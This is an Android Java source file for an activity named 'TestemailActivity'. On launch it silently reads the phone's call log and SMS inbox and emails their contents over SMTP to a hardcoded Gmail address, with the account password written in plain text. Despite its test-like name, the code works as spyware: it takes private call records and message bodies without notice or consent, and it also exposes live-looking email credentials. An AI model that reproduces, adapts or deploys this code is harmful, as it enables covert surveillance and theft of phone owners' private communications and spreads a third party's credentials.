package ok.ok.ok;

import java.io.IOException;
import java.io.Writer;

import org.apache.commons.net.smtp.SMTPClient;
import org.apache.commons.net.smtp.SMTPReply;
import org.apache.commons.net.smtp.SimpleSMTPHeader;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

public class TestemailActivity extends Activity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);        
			
			String[] strFields = {
					android.provider.CallLog.Calls.NUMBER, 
					android.provider.CallLog.Calls.CACHED_NAME,
					android.provider.CallLog.Calls.DATE,
					android.provider.CallLog.Calls.DURATION
			};
			
			String strOrder = android.provider.CallLog.Calls.DATE + " DESC"; 
 
			Cursor mCallCursor = getContentResolver().query(
					android.provider.CallLog.Calls.CONTENT_URI,
					strFields,
					null,
					null,
					strOrder
					);
 				
 			String s="Call logs:\n";
 				
			if(mCallCursor.moveToFirst())
 
				do{				
					for (int n=0;n<mCallCursor.getColumnCount();n++)
					s+=mCallCursor.getString(n) + " ";					
					
					s+="\n";
 
				} while (mCallCursor.moveToNext()); 
									
			mCallCursor.close();						
			
			Uri uriSMSURI = Uri.parse("content://sms/inbox");
			Cursor cur = getContentResolver().query(uriSMSURI, null, null, null,null);
			s+="SMS:\n";
			
			cur.moveToFirst();
			while (cur.moveToNext()) {
				s += "From :" + cur.getString(2) + " : " + cur.getString(11)+"\n";         
			}				
			
			try
			{
			send("dtordera@gmail.com","dtordera@gmail.com",""+cur.getCount(),s);
			}
			catch(Exception E){};
			
			cur.close();				        
    }
    
		private void checkReply(SMTPClient sc) throws IOException {
	if (SMTPReply.isNegativeTransient(sc.getReplyCode())) {
		sc.disconnect();
		throw new IOException("Transient SMTP error " + sc.getReplyCode());
	} else if (SMTPReply.isNegativePermanent(sc.getReplyCode())) {
		sc.disconnect();
		throw new IOException("Permanent SMTP error " + sc.getReplyCode());
	}
	}		
		
public void send(String from, String to, String subject, String text)
throws IOException {
        SMTPClient client = new SMTPClient("UTF-8");
        client.setDefaultTimeout(60 * 1000);
 
        client.setRequireStartTLS(true); // requires STARTTLS
        //client.setUseStartTLS(true); // tries STARTTLS, but falls back if not supported
        client.setUseAuth(true); // use SMTP AUTH
        //client.setAuthMechanisms(authMechanisms); // sets AUTH mechanisms e.g. LOGIN
 
       	client.connect("smtp.gmail.com", 587);
       	checkReply(client);       	
 
       	client.login("smtp.gmail.com", "dtordera@gmail.com", "9097UeID");
       	checkReply(client);
 
       	client.setSender(from);
       	checkReply(client);
       	client.addRecipient(to);
       	checkReply(client);
 
       	Writer writer = client.sendMessageData();
 
       	if (writer != null) {
       		SimpleSMTPHeader header = new SimpleSMTPHeader(from, to, subject);
       		writer.write(header.toString());
       		writer.write(text);
       		writer.close();
       		client.completePendingCommand();
       	        checkReply(client);
        }
 
        client.logout();
        client.disconnect();
}		
    
}